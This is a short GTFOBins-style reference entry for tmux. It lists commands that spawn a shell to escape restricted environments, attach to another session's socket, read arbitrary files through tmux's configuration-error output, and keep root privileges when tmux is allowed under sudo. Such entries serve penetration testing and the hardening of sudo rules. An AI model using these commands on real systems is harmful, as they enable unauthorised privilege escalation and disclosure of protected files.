# GTFOBin: tmux

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
tmux
```

Provided to have enough permissions to access the socket.

```
tmux -S /path/to/socket_name
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.

```
LFILE=file_to_read
tmux -f $LFILE
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo tmux
```